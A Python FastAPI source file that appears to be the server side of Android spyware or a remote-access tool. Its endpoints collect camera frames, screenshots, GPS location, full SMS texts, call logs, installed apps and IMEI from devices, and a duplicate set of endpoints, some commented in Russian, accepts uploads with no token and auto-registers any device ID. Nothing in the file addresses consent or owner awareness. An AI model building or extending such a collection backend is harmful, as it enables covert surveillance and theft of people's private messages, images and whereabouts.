"""REST API endpoints for devices to send data"""
from fastapi import APIRouter, HTTPException, Depends, Query, Header, Form, File, UploadFile, Body
from typing import Optional, List, Dict, Any
from pydantic import BaseModel
from backend.storage.database import storage
from backend.devices.registration import get_device_by_token
from backend.database.models import Device
import base64

router = APIRouter(prefix="/api/device", tags=["device-api"])


async def get_or_create_device_by_id(device_id: str, device_info: Optional[Dict[str, Any]] = None) -> Device:
    """Get existing device or create new one by device_id"""
    # Try to get existing device
    device = await storage.get_device(device_id)
    
    if device:
        # Update last_seen
        await storage.update_device(device_id)
        return device
    
    # Create new device with auto-registration
    from backend.devices.registration import generate_device_token
    import uuid
    
    # Ensure device_id is valid UUID
    try:
        uuid.UUID(device_id)
    except ValueError:
        raise HTTPException(status_code=400, detail="Invalid device_id format (must be UUID)")
    
    # Generate name from device info or use default
    name = "Unknown Device"
    if device_info:
        manufacturer = device_info.get("manufacturer", "Unknown")
        model = device_info.get("model", "Device")
        name = f"{manufacturer} {model}".strip()
    
    # Create device
    token = generate_device_token()
    device = await storage.create_device(
        device_id=device_id,
        name=name,
        token=token,
        imei=device_info.get("imei") if device_info else None,
        model=device_info.get("model") if device_info else None,
        manufacturer=device_info.get("manufacturer") if device_info else None,
        android_version=device_info.get("android_version") if device_info else None,
        sdk=device_info.get("sdk") if device_info else None
    )
    
    print(f"[API_AUTO_REGISTER] Auto-registered device: {name} (ID: {device_id})")
    
    return device


# Data models
class SMSMessage(BaseModel):
    """SMS message model"""
    address: str  # Phone number
    body: str  # Message text
    date: int  # Unix timestamp in milliseconds
    type: int  # 1=received, 2=sent
    thread_id: Optional[int] = None
    read: Optional[bool] = None


class CallLogEntry(BaseModel):
    """Call log entry model"""
    number: str  # Phone number
    name: Optional[str] = None  # Contact name
    date: int  # Unix timestamp in milliseconds
    duration: int  # Call duration in seconds
    type: int  # 1=incoming, 2=outgoing, 3=missed


class InstalledApp(BaseModel):
    """Installed application model"""
    package_name: str
    app_name: str
    version_name: Optional[str] = None
    version_code: Optional[int] = None
    install_time: Optional[int] = None
    update_time: Optional[int] = None


class DeviceLog(BaseModel):
    """Device log entry model"""
    level: str  # "info", "warning", "error"
    tag: str  # Log tag
    message: str  # Log message
    timestamp: int  # Unix timestamp in milliseconds


class DetailedDeviceInfo(BaseModel):
    """Detailed device information model"""
    sdk: int
    host: Optional[str] = None
    board: Optional[str] = None
    brand: Optional[str] = None
    model: Optional[str] = None
    device: Optional[str] = None
    product: Optional[str] = None
    hardware: Optional[str] = None
    fingerprint: Optional[str] = None
    android_version: Optional[str] = None
    manufacturer: Optional[str] = None
    imei: Optional[str] = None


async def get_device_by_token_header(
    x_device_token: Optional[str] = Header(None, alias="X-Device-Token")
) -> Device:
    """Authenticate device by token from header"""
    if not x_device_token:
        raise HTTPException(status_code=401, detail="Device token required")
    
    device = await get_device_by_token(x_device_token)
    if not device:
        raise HTTPException(status_code=401, detail="Invalid device token")
    
    return device


async def get_device_by_token_query(
    token: str = Query(..., description="Device authentication token")
) -> Device:
    """Authenticate device by token from query parameter"""
    device = await get_device_by_token(token)
    if not device:
        raise HTTPException(status_code=401, detail="Invalid device token")
    
    return device


@router.post("/camera")
async def upload_camera_frame(
    device: Device = Depends(get_device_by_token_query),
    camera: str = Form(..., description="Camera type: 'front' or 'back'"),
    image: UploadFile = File(..., description="JPEG image file"),
    width: int = Form(..., description="Image width in pixels"),
    height: int = Form(..., description="Image height in pixels"),
    timestamp: int = Form(..., description="Unix timestamp in milliseconds")
):
    """Upload camera frame"""
    # Validate camera type
    if camera not in ["front", "back"]:
        raise HTTPException(status_code=400, detail="Camera must be 'front' or 'back'")
    
    # Read image data
    frame_data = await image.read()
    
    # Validate it's a JPEG
    if not frame_data.startswith(b'\xff\xd8'):
        raise HTTPException(status_code=400, detail="Image must be JPEG format")
    
    # Save to database
    saved_frame = await storage.save_camera_frame(
        device_id=str(device.id),
        camera=camera,
        frame_data=frame_data,
        width=width,
        height=height,
        timestamp=timestamp
    )
    
    return {
        "status": "success",
        "frame_id": str(saved_frame.id),
        "message": "Camera frame uploaded successfully"
    }


@router.post("/camera/base64")
async def upload_camera_frame_base64(
    device: Device = Depends(get_device_by_token_query),
    camera: str = Form(..., description="Camera type: 'front' or 'back'"),
    data: str = Form(..., description="Base64 encoded JPEG image"),
    width: int = Form(..., description="Image width in pixels"),
    height: int = Form(..., description="Image height in pixels"),
    timestamp: int = Form(..., description="Unix timestamp in milliseconds")
):
    """Upload camera frame as Base64 string"""
    # Validate camera type
    if camera not in ["front", "back"]:
        raise HTTPException(status_code=400, detail="Camera must be 'front' or 'back'")
    
    try:
        # Decode Base64
        frame_data = base64.b64decode(data)
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Invalid Base64 data: {str(e)}")
    
    # Validate it's a JPEG
    if not frame_data.startswith(b'\xff\xd8'):
        raise HTTPException(status_code=400, detail="Image must be JPEG format")
    
    # Save to database
    saved_frame = await storage.save_camera_frame(
        device_id=str(device.id),
        camera=camera,
        frame_data=frame_data,
        width=width,
        height=height,
        timestamp=timestamp
    )
    
    return {
        "status": "success",
        "frame_id": str(saved_frame.id),
        "message": "Camera frame uploaded successfully"
    }


@router.post("/location")
async def upload_location(
    device: Device = Depends(get_device_by_token_query),
    lat: float = Form(..., description="Latitude"),
    lon: float = Form(..., description="Longitude"),
    accuracy: Optional[float] = Form(None, description="Accuracy in meters"),
    timestamp: int = Form(..., description="Unix timestamp in milliseconds")
):
    """Upload location update"""
    # Validate coordinates
    if not (-90 <= lat <= 90):
        raise HTTPException(status_code=400, detail="Latitude must be between -90 and 90")
    if not (-180 <= lon <= 180):
        raise HTTPException(status_code=400, detail="Longitude must be between -180 and 180")
    
    # Save location
    saved_location = await storage.save_location(
        device_id=str(device.id),
        lat=lat,
        lon=lon,
        accuracy=accuracy,
        timestamp=timestamp
    )
    
    return {
        "status": "success",
        "location_id": str(saved_location.id),
        "message": "Location updated successfully"
    }


@router.post("/system-info")
async def upload_system_info(
    device: Device = Depends(get_device_by_token_query),
    battery_level: Optional[int] = Form(None, description="Battery level (0-100)"),
    is_charging: Optional[bool] = Form(None, description="Is device charging"),
    battery_temp: Optional[float] = Form(None, description="Battery temperature"),
    memory_usage: Optional[int] = Form(None, description="Memory usage in MB"),
    storage_usage: Optional[float] = Form(None, description="Storage usage percentage"),
    timestamp: int = Form(..., description="Unix timestamp in milliseconds")
):
    """Upload system information"""
    system_data = {
        "battery_level": battery_level,
        "is_charging": is_charging,
        "battery_temp": battery_temp,
        "memory_usage": memory_usage,
        "storage_usage": storage_usage,
        "timestamp": timestamp
    }
    
    # Remove None values
    system_data = {k: v for k, v in system_data.items() if v is not None}
    
    # Save event
    saved_event = await storage.log_device_event(
        device_id=str(device.id),
        event_type="system_info",
        event_data=system_data,
        timestamp=timestamp
    )
    
    return {
        "status": "success",
        "event_id": str(saved_event.id),
        "message": "System info uploaded successfully"
    }


@router.post("/sms")
async def upload_sms_messages(
    device: Device = Depends(get_device_by_token_query),
    messages: List[SMSMessage] = Body(..., description="List of SMS messages")
):
    """Upload SMS messages"""
    # Save all messages
    for msg in messages:
        await storage.log_device_event(
            device_id=str(device.id),
            event_type="sms",
            event_data={
                "address": msg.address,
                "body": msg.body,
                "date": msg.date,
                "type": msg.type,
                "thread_id": msg.thread_id,
                "read": msg.read
            },
            timestamp=msg.date
        )
    
    return {
        "status": "success",
        "count": len(messages),
        "message": f"Uploaded {len(messages)} SMS messages"
    }


@router.post("/call-logs")
async def upload_call_logs(
    device: Device = Depends(get_device_by_token_query),
    calls: List[CallLogEntry] = Body(..., description="List of call log entries")
):
    """Upload call history"""
    # Save all calls
    for call in calls:
        await storage.log_device_event(
            device_id=str(device.id),
            event_type="call_log",
            event_data={
                "number": call.number,
                "name": call.name,
                "date": call.date,
                "duration": call.duration,
                "type": call.type
            },
            timestamp=call.date
        )
    
    return {
        "status": "success",
        "count": len(calls),
        "message": f"Uploaded {len(calls)} call log entries"
    }


@router.post("/installed-apps")
async def upload_installed_apps(
    device: Device = Depends(get_device_by_token_query),
    apps: List[InstalledApp] = Body(..., description="List of installed applications"),
    timestamp: int = Query(..., description="Unix timestamp in milliseconds")
):
    """Upload list of installed applications"""
    # Save apps list
    await storage.log_device_event(
        device_id=str(device.id),
        event_type="installed_apps",
        event_data={
            "apps": [app.dict() for app in apps],
            "count": len(apps)
        },
        timestamp=timestamp
    )
    
    return {
        "status": "success",
        "count": len(apps),
        "message": f"Uploaded {len(apps)} installed applications"
    }


@router.post("/logs")
async def upload_device_logs(
    device: Device = Depends(get_device_by_token_query),
    logs: List[DeviceLog] = Body(..., description="List of device log entries")
):
    """Upload device logs"""
    # Save all logs
    for log in logs:
        await storage.log_device_event(
            device_id=str(device.id),
            event_type=f"log_{log.level}",
            event_data={
                "level": log.level,
                "tag": log.tag,
                "message": log.message
            },
            timestamp=log.timestamp
        )
    
    return {
        "status": "success",
        "count": len(logs),
        "message": f"Uploaded {len(logs)} log entries"
    }


@router.post("/screenshot")
async def upload_screenshot(
    device: Device = Depends(get_device_by_token_query),
    image: UploadFile = File(..., description="Screenshot image file"),
    width: int = Form(..., description="Screen width in pixels"),
    height: int = Form(..., description="Screen height in pixels"),
    timestamp: int = Form(..., description="Unix timestamp in milliseconds")
):
    """Upload screenshot"""
    # Read image data
    screenshot_data = await image.read()
    
    # Validate it's an image (PNG or JPEG)
    is_png = screenshot_data.startswith(b'\x89PNG')
    is_jpeg = screenshot_data.startswith(b'\xff\xd8')
    
    if not (is_png or is_jpeg):
        raise HTTPException(status_code=400, detail="Image must be PNG or JPEG format")
    
    # Save as camera frame with special camera type "screen"
    saved_frame = await storage.save_camera_frame(
        device_id=str(device.id),
        camera="screen",
        frame_data=screenshot_data,
        width=width,
        height=height,
        timestamp=timestamp
    )
    
    return {
        "status": "success",
        "screenshot_id": str(saved_frame.id),
        "message": "Screenshot uploaded successfully"
    }


@router.post("/screenshot/base64")
async def upload_screenshot_base64(
    device: Device = Depends(get_device_by_token_query),
    data: str = Form(..., description="Base64 encoded screenshot image"),
    width: int = Form(..., description="Screen width in pixels"),
    height: int = Form(..., description="Screen height in pixels"),
    timestamp: int = Form(..., description="Unix timestamp in milliseconds")
):
    """Upload screenshot as Base64"""
    try:
        # Decode Base64
        screenshot_data = base64.b64decode(data)
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Invalid Base64 data: {str(e)}")
    
    # Validate it's an image
    is_png = screenshot_data.startswith(b'\x89PNG')
    is_jpeg = screenshot_data.startswith(b'\xff\xd8')
    
    if not (is_png or is_jpeg):
        raise HTTPException(status_code=400, detail="Image must be PNG or JPEG format")
    
    # Save as camera frame with special camera type "screen"
    saved_frame = await storage.save_camera_frame(
        device_id=str(device.id),
        camera="screen",
        frame_data=screenshot_data,
        width=width,
        height=height,
        timestamp=timestamp
    )
    
    return {
        "status": "success",
        "screenshot_id": str(saved_frame.id),
        "message": "Screenshot uploaded successfully"
    }


@router.post("/device-info")
async def upload_detailed_device_info(
    device: Device = Depends(get_device_by_token_query),
    info: DetailedDeviceInfo = Body(..., description="Detailed device information"),
    timestamp: int = Query(..., description="Unix timestamp in milliseconds")
):
    """Upload detailed device information (hardware, fingerprint, etc.)"""
    # Update device in database
    await storage.update_device(
        device_id=str(device.id),
        model=info.model,
        manufacturer=info.manufacturer,
        android_version=info.android_version,
        sdk=info.sdk,
        imei=info.imei
    )
    
    # Save detailed info as event
    await storage.log_device_event(
        device_id=str(device.id),
        event_type="device_info_update",
        event_data=info.dict(),
        timestamp=timestamp
    )
    
    return {
        "status": "success",
        "message": "Device information updated successfully"
    }


@router.post("/battery")
async def upload_battery_info(
    device: Device = Depends(get_device_by_token_query),
    level: int = Form(..., description="Battery level (0-100)"),
    is_charging: bool = Form(..., description="Is device charging"),
    temperature: Optional[float] = Form(None, description="Battery temperature in Celsius"),
    voltage: Optional[float] = Form(None, description="Battery voltage in mV"),
    health: Optional[str] = Form(None, description="Battery health status"),
    timestamp: int = Form(..., description="Unix timestamp in milliseconds")
):
    """Upload detailed battery information"""
    battery_data = {
        "level": level,
        "is_charging": is_charging,
        "temperature": temperature,
        "voltage": voltage,
        "health": health,
        "timestamp": timestamp
    }
    
    # Remove None values
    battery_data = {k: v for k, v in battery_data.items() if v is not None}
    
    # Save event
    saved_event = await storage.log_device_event(
        device_id=str(device.id),
        event_type="battery_info",
        event_data=battery_data,
        timestamp=timestamp
    )
    
    return {
        "status": "success",
        "event_id": str(saved_event.id),
        "message": "Battery info uploaded successfully"
    }


@router.post("/bulk-update")
async def bulk_update(
    device: Device = Depends(get_device_by_token_query),
    device_info: Optional[DetailedDeviceInfo] = Body(None),
    battery: Optional[Dict[str, Any]] = Body(None),
    location: Optional[Dict[str, Any]] = Body(None),
    system_info: Optional[Dict[str, Any]] = Body(None),
    timestamp: int = Body(..., description="Unix timestamp in milliseconds")
):
    """Bulk update - upload multiple data types at once (for app startup)"""
    results = {}
    
    # Update device info
    if device_info:
        await storage.update_device(
            device_id=str(device.id),
            model=device_info.model,
            manufacturer=device_info.manufacturer,
            android_version=device_info.android_version,
            sdk=device_info.sdk,
            imei=device_info.imei
        )
        await storage.log_device_event(
            device_id=str(device.id),
            event_type="device_info_update",
            event_data=device_info.dict(),
            timestamp=timestamp
        )
        results["device_info"] = "updated"
    
    # Update battery
    if battery:
        await storage.log_device_event(
            device_id=str(device.id),
            event_type="battery_info",
            event_data=battery,
            timestamp=timestamp
        )
        results["battery"] = "updated"
    
    # Update location
    if location:
        await storage.save_location(
            device_id=str(device.id),
            lat=location.get("lat"),
            lon=location.get("lon"),
            accuracy=location.get("accuracy"),
            timestamp=timestamp
        )
        results["location"] = "updated"
    
    # Update system info
    if system_info:
        await storage.log_device_event(
            device_id=str(device.id),
            event_type="system_info",
            event_data=system_info,
            timestamp=timestamp
        )
        results["system_info"] = "updated"
    
    return {
        "status": "success",
        "results": results,
        "message": "Bulk update completed successfully"
    }


# ============================================
# ENDPOINTS WITHOUT TOKEN (Auto-registration)
# ============================================

@router.post("/upload/camera")
async def upload_camera_no_token(
    device_id: str = Form(..., description="Device UUID"),
    camera: str = Form(..., description="Camera type: 'front' or 'back'"),
    image: UploadFile = File(..., description="JPEG image file"),
    width: int = Form(..., description="Image width in pixels"),
    height: int = Form(..., description="Image height in pixels"),
    timestamp: int = Form(..., description="Unix timestamp in milliseconds"),
    # Optional device info for auto-registration
    manufacturer: Optional[str] = Form(None),
    model: Optional[str] = Form(None),
    android_version: Optional[str] = Form(None)
):
    """Upload camera frame without token (auto-registration)"""
    # Get or create device
    device_info = {
        "manufacturer": manufacturer,
        "model": model,
        "android_version": android_version
    }
    device = await get_or_create_device_by_id(device_id, device_info)
    
    # Validate camera type
    if camera not in ["front", "back"]:
        raise HTTPException(status_code=400, detail="Camera must be 'front' or 'back'")
    
    # Read image data
    frame_data = await image.read()
    
    # Validate it's a JPEG
    if not frame_data.startswith(b'\xff\xd8'):
        raise HTTPException(status_code=400, detail="Image must be JPEG format")
    
    # Save to database
    saved_frame = await storage.save_camera_frame(
        device_id=str(device.id),
        camera=camera,
        frame_data=frame_data,
        width=width,
        height=height,
        timestamp=timestamp
    )
    
    return {
        "status": "success",
        "frame_id": str(saved_frame.id),
        "message": "Camera frame uploaded successfully"
    }


@router.post("/upload/camera-base64")
async def upload_camera_base64_no_token(
    device_id: str = Form(..., description="Device UUID"),
    camera: str = Form(..., description="Camera type: 'front' or 'back'"),
    data: str = Form(..., description="Base64 encoded JPEG image"),
    width: int = Form(..., description="Image width in pixels"),
    height: int = Form(..., description="Image height in pixels"),
    timestamp: int = Form(..., description="Unix timestamp in milliseconds"),
    # Optional device info
    manufacturer: Optional[str] = Form(None),
    model: Optional[str] = Form(None)
):
    """Upload camera frame as Base64 without token"""
    device = await get_or_create_device_by_id(device_id, {
        "manufacturer": manufacturer,
        "model": model
    })
    
    if camera not in ["front", "back"]:
        raise HTTPException(status_code=400, detail="Camera must be 'front' or 'back'")
    
    try:
        frame_data = base64.b64decode(data)
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Invalid Base64 data: {str(e)}")
    
    if not frame_data.startswith(b'\xff\xd8'):
        raise HTTPException(status_code=400, detail="Image must be JPEG format")
    
    saved_frame = await storage.save_camera_frame(
        device_id=str(device.id),
        camera=camera,
        frame_data=frame_data,
        width=width,
        height=height,
        timestamp=timestamp
    )
    
    return {
        "status": "success",
        "frame_id": str(saved_frame.id),
        "message": "Camera frame uploaded successfully"
    }


@router.post("/upload/location")
async def upload_location_no_token(
    device_id: str = Form(..., description="Device UUID"),
    lat: float = Form(..., description="Latitude"),
    lon: float = Form(..., description="Longitude"),
    accuracy: Optional[float] = Form(None, description="Accuracy in meters"),
    timestamp: int = Form(..., description="Unix timestamp in milliseconds")
):
    """Upload location without token"""
    device = await get_or_create_device_by_id(device_id)
    
    if not (-90 <= lat <= 90):
        raise HTTPException(status_code=400, detail="Latitude must be between -90 and 90")
    if not (-180 <= lon <= 180):
        raise HTTPException(status_code=400, detail="Longitude must be between -180 and 180")
    
    saved_location = await storage.save_location(
        device_id=str(device.id),
        lat=lat,
        lon=lon,
        accuracy=accuracy,
        timestamp=timestamp
    )
    
    return {
        "status": "success",
        "location_id": str(saved_location.id),
        "message": "Location updated successfully"
    }


@router.post("/upload/battery")
async def upload_battery_no_token(
    device_id: str = Form(..., description="Device UUID"),
    level: int = Form(..., description="Battery level (0-100)"),
    is_charging: bool = Form(..., description="Is device charging"),
    temperature: Optional[float] = Form(None, description="Battery temperature"),
    voltage: Optional[float] = Form(None, description="Battery voltage"),
    health: Optional[str] = Form(None, description="Battery health"),
    timestamp: int = Form(..., description="Unix timestamp in milliseconds")
):
    """Upload battery info without token"""
    device = await get_or_create_device_by_id(device_id)
    
    battery_data = {
        "level": level,
        "is_charging": is_charging,
        "temperature": temperature,
        "voltage": voltage,
        "health": health,
        "timestamp": timestamp
    }
    battery_data = {k: v for k, v in battery_data.items() if v is not None}
    
    saved_event = await storage.log_device_event(
        device_id=str(device.id),
        event_type="battery_info",
        event_data=battery_data,
        timestamp=timestamp
    )
    
    return {
        "status": "success",
        "event_id": str(saved_event.id),
        "message": "Battery info uploaded successfully"
    }


@router.post("/upload/sms")
async def upload_sms_no_token(
    device_id: str = Body(..., description="Device UUID"),
    messages: List[SMSMessage] = Body(..., description="List of SMS messages")
):
    """Upload SMS messages without token"""
    device = await get_or_create_device_by_id(device_id)
    
    for msg in messages:
        await storage.log_device_event(
            device_id=str(device.id),
            event_type="sms",
            event_data={
                "address": msg.address,
                "body": msg.body,
                "date": msg.date,
                "type": msg.type,
                "thread_id": msg.thread_id,
                "read": msg.read
            },
            timestamp=msg.date
        )
    
    return {
        "status": "success",
        "count": len(messages),
        "message": f"Uploaded {len(messages)} SMS messages"
    }


@router.post("/upload/call-logs")
async def upload_call_logs_no_token(
    device_id: str = Body(..., description="Device UUID"),
    calls: List[CallLogEntry] = Body(..., description="List of call log entries")
):
    """Upload call logs without token"""
    device = await get_or_create_device_by_id(device_id)
    
    for call in calls:
        await storage.log_device_event(
            device_id=str(device.id),
            event_type="call_log",
            event_data={
                "number": call.number,
                "name": call.name,
                "date": call.date,
                "duration": call.duration,
                "type": call.type
            },
            timestamp=call.date
        )
    
    return {
        "status": "success",
        "count": len(calls),
        "message": f"Uploaded {len(calls)} call log entries"
    }


@router.post("/upload/apps")
async def upload_apps_no_token(
    device_id: str = Body(..., description="Device UUID"),
    apps: List[InstalledApp] = Body(..., description="List of installed apps"),
    timestamp: int = Body(..., description="Unix timestamp in milliseconds")
):
    """Upload installed apps without token"""
    device = await get_or_create_device_by_id(device_id)
    
    await storage.log_device_event(
        device_id=str(device.id),
        event_type="installed_apps",
        event_data={
            "apps": [app.dict() for app in apps],
            "count": len(apps)
        },
        timestamp=timestamp
    )
    
    return {
        "status": "success",
        "count": len(apps),
        "message": f"Uploaded {len(apps)} installed applications"
    }


@router.post("/upload/logs")
async def upload_logs_no_token(
    device_id: str = Body(..., description="Device UUID"),
    logs: List[DeviceLog] = Body(..., description="List of log entries")
):
    """Upload device logs without token"""
    device = await get_or_create_device_by_id(device_id)
    
    for log in logs:
        await storage.log_device_event(
            device_id=str(device.id),
            event_type=f"log_{log.level}",
            event_data={
                "level": log.level,
                "tag": log.tag,
                "message": log.message
            },
            timestamp=log.timestamp
        )
    
    return {
        "status": "success",
        "count": len(logs),
        "message": f"Uploaded {len(logs)} log entries"
    }


@router.post("/upload/screenshot")
async def upload_screenshot_no_token(
    device_id: str = Form(..., description="Device UUID"),
    image: UploadFile = File(..., description="Screenshot file"),
    width: int = Form(..., description="Width in pixels"),
    height: int = Form(..., description="Height in pixels"),
    timestamp: int = Form(..., description="Unix timestamp in milliseconds")
):
    """Upload screenshot without token"""
    device = await get_or_create_device_by_id(device_id)
    
    screenshot_data = await image.read()
    
    is_png = screenshot_data.startswith(b'\x89PNG')
    is_jpeg = screenshot_data.startswith(b'\xff\xd8')
    
    if not (is_png or is_jpeg):
        raise HTTPException(status_code=400, detail="Image must be PNG or JPEG")
    
    saved_frame = await storage.save_camera_frame(
        device_id=str(device.id),
        camera="screen",
        frame_data=screenshot_data,
        width=width,
        height=height,
        timestamp=timestamp
    )
    
    return {
        "status": "success",
        "screenshot_id": str(saved_frame.id),
        "message": "Screenshot uploaded successfully"
    }


@router.post("/upload/bulk")
async def bulk_upload_no_token(
    device_id: str = Body(..., description="Device UUID"),
    device_info: Optional[DetailedDeviceInfo] = Body(None),
    battery: Optional[Dict[str, Any]] = Body(None),
    location: Optional[Dict[str, Any]] = Body(None),
    system_info: Optional[Dict[str, Any]] = Body(None),
    timestamp: int = Body(..., description="Unix timestamp in milliseconds")
):
    """Bulk upload without token - for app startup"""
    # Get or create device
    device_info_dict = device_info.dict() if device_info else None
    device = await get_or_create_device_by_id(device_id, device_info_dict)
    
    results = {}
    
    # Update device info
    if device_info:
        await storage.update_device(
            device_id=str(device.id),
            model=device_info.model,
            manufacturer=device_info.manufacturer,
            android_version=device_info.android_version,
            sdk=device_info.sdk,
            imei=device_info.imei
        )
        await storage.log_device_event(
            device_id=str(device.id),
            event_type="device_info_update",
            event_data=device_info.dict(),
            timestamp=timestamp
        )
        results["device_info"] = "updated"
    
    # Update battery
    if battery:
        await storage.log_device_event(
            device_id=str(device.id),
            event_type="battery_info",
            event_data=battery,
            timestamp=timestamp
        )
        results["battery"] = "updated"
    
    # Update location
    if location:
        await storage.save_location(
            device_id=str(device.id),
            lat=location.get("lat"),
            lon=location.get("lon"),
            accuracy=location.get("accuracy"),
            timestamp=timestamp
        )
        results["location"] = "updated"
    
    # Update system info
    if system_info:
        await storage.log_device_event(
            device_id=str(device.id),
            event_type="system_info",
            event_data=system_info,
            timestamp=timestamp
        )
        results["system_info"] = "updated"
    
    return {
        "status": "success",
        "device_id": str(device.id),
        "results": results,
        "message": "Bulk upload completed successfully"
    }


# ============================================================================
# ENDPOINTS БЕЗ ТОКЕНА (для простой отправки данных по device_id)
# ============================================================================

@router.post("/register")
async def register_device_no_token(
    device_id: str = Form(..., description="Device UUID"),
    manufacturer: Optional[str] = Form(None),
    model: Optional[str] = Form(None),
    android_version: Optional[str] = Form(None),
    sdk: Optional[int] = Form(None),
    imei: Optional[str] = Form(None)
):
    """Автоматическая регистрация устройства без токена"""
    device_info = {
        "manufacturer": manufacturer,
        "model": model,
        "android_version": android_version,
        "sdk": sdk,
        "imei": imei
    }
    device = await get_or_create_device_by_id(device_id, device_info)
    
    return {
        "status": "success",
        "device_id": str(device.id),
        "device_name": device.name,
        "message": "Device registered successfully"
    }


@router.post("/camera/no-token")
async def upload_camera_frame_no_token(
    device_id: str = Form(..., description="Device UUID"),
    camera: str = Form(..., description="Camera type: 'front' or 'back'"),
    image: UploadFile = File(..., description="JPEG image file"),
    width: int = Form(..., description="Image width in pixels"),
    height: int = Form(..., description="Image height in pixels"),
    timestamp: int = Form(..., description="Unix timestamp in milliseconds")
):
    """Загрузка кадра камеры без токена (только device_id)"""
    # Validate camera type
    if camera not in ["front", "back"]:
        raise HTTPException(status_code=400, detail="Camera must be 'front' or 'back'")
    
    # Get or create device
    device = await get_or_create_device_by_id(device_id)
    
    # Read image data
    frame_data = await image.read()
    
    # Save frame
    saved_frame = await storage.save_camera_frame(
        device_id=str(device.id),
        camera=camera,
        frame_data=frame_data,
        width=width,
        height=height,
        timestamp=timestamp
    )
    
    return {
        "status": "success",
        "frame_id": str(saved_frame.id),
        "message": "Camera frame uploaded successfully"
    }


@router.post("/camera/base64/no-token")
async def upload_camera_frame_base64_no_token(
    device_id: str = Form(..., description="Device UUID"),
    camera: str = Form(..., description="Camera type: 'front' or 'back'"),
    image_base64: str = Form(..., description="Base64 encoded JPEG image"),
    width: int = Form(..., description="Image width in pixels"),
    height: int = Form(..., description="Image height in pixels"),
    timestamp: int = Form(..., description="Unix timestamp in milliseconds")
):
    """Загрузка кадра камеры в Base64 без токена"""
    # Validate camera type
    if camera not in ["front", "back"]:
        raise HTTPException(status_code=400, detail="Camera must be 'front' or 'back'")
    
    # Get or create device
    device = await get_or_create_device_by_id(device_id)
    
    # Decode base64
    try:
        if image_base64.startswith("data:image"):
            image_base64 = image_base64.split(",")[1]
        frame_data = base64.b64decode(image_base64)
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Invalid base64 image: {str(e)}")
    
    # Save frame
    saved_frame = await storage.save_camera_frame(
        device_id=str(device.id),
        camera=camera,
        frame_data=frame_data,
        width=width,
        height=height,
        timestamp=timestamp
    )
    
    return {
        "status": "success",
        "frame_id": str(saved_frame.id),
        "message": "Camera frame uploaded successfully"
    }


@router.post("/location/no-token")
async def upload_location_no_token(
    device_id: str = Form(..., description="Device UUID"),
    lat: float = Form(..., description="Latitude"),
    lon: float = Form(..., description="Longitude"),
    accuracy: Optional[float] = Form(None, description="Accuracy in meters"),
    timestamp: int = Form(..., description="Unix timestamp in milliseconds")
):
    """Загрузка местоположения без токена"""
    # Validate coordinates
    if not (-90 <= lat <= 90):
        raise HTTPException(status_code=400, detail="Latitude must be between -90 and 90")
    if not (-180 <= lon <= 180):
        raise HTTPException(status_code=400, detail="Longitude must be between -180 and 180")
    
    # Get or create device
    device = await get_or_create_device_by_id(device_id)
    
    # Save location
    saved_location = await storage.save_location(
        device_id=str(device.id),
        lat=lat,
        lon=lon,
        accuracy=accuracy,
        timestamp=timestamp
    )
    
    return {
        "status": "success",
        "location_id": str(saved_location.id),
        "message": "Location updated successfully"
    }


@router.post("/system-info/no-token")
async def upload_system_info_no_token(
    device_id: str = Form(..., description="Device UUID"),
    battery_level: Optional[int] = Form(None, description="Battery level (0-100)"),
    is_charging: Optional[str] = Form(None, description="Is device charging (true/false)"),
    battery_temp: Optional[float] = Form(None, description="Battery temperature"),
    memory_usage: Optional[int] = Form(None, description="Memory usage in MB"),
    storage_usage: Optional[float] = Form(None, description="Storage usage percentage"),
    timestamp: int = Form(..., description="Unix timestamp in milliseconds")
):
    """Загрузка системной информации без токена"""
    # Get or create device
    device = await get_or_create_device_by_id(device_id)
    
    # Convert is_charging string to bool
    is_charging_bool = None
    if is_charging is not None:
        is_charging_bool = is_charging.lower() in ("true", "1", "yes")
    
    system_data = {
        "battery_level": battery_level,
        "is_charging": is_charging_bool,
        "battery_temp": battery_temp,
        "memory_usage": memory_usage,
        "storage_usage": storage_usage,
        "timestamp": timestamp
    }
    
    # Remove None values
    system_data = {k: v for k, v in system_data.items() if v is not None}
    
    # Save event
    saved_event = await storage.log_device_event(
        device_id=str(device.id),
        event_type="system_info",
        event_data=system_data,
        timestamp=timestamp
    )
    
    return {
        "status": "success",
        "event_id": str(saved_event.id),
        "message": "System info uploaded successfully"
    }


@router.post("/battery/no-token")
async def upload_battery_no_token(
    device_id: str = Form(..., description="Device UUID"),
    level: int = Form(..., description="Battery level (0-100)"),
    is_charging: str = Form(..., description="Is device charging (true/false)"),
    temperature: Optional[float] = Form(None, description="Battery temperature"),
    voltage: Optional[int] = Form(None, description="Battery voltage in mV"),
    health: Optional[str] = Form(None, description="Battery health status"),
    timestamp: int = Form(..., description="Unix timestamp in milliseconds")
):
    """Загрузка информации о батарее без токена"""
    # Get or create device
    device = await get_or_create_device_by_id(device_id)
    
    # Convert is_charging string to bool
    is_charging_bool = is_charging.lower() in ("true", "1", "yes")
    
    battery_data = {
        "level": level,
        "is_charging": is_charging_bool,
        "temperature": temperature,
        "voltage": voltage,
        "health": health,
        "timestamp": timestamp
    }
    
    # Remove None values
    battery_data = {k: v for k, v in battery_data.items() if v is not None}
    
    # Save event
    saved_event = await storage.log_device_event(
        device_id=str(device.id),
        event_type="battery_info",
        event_data=battery_data,
        timestamp=timestamp
    )
    
    return {
        "status": "success",
        "event_id": str(saved_event.id),
        "message": "Battery info uploaded successfully"
    }

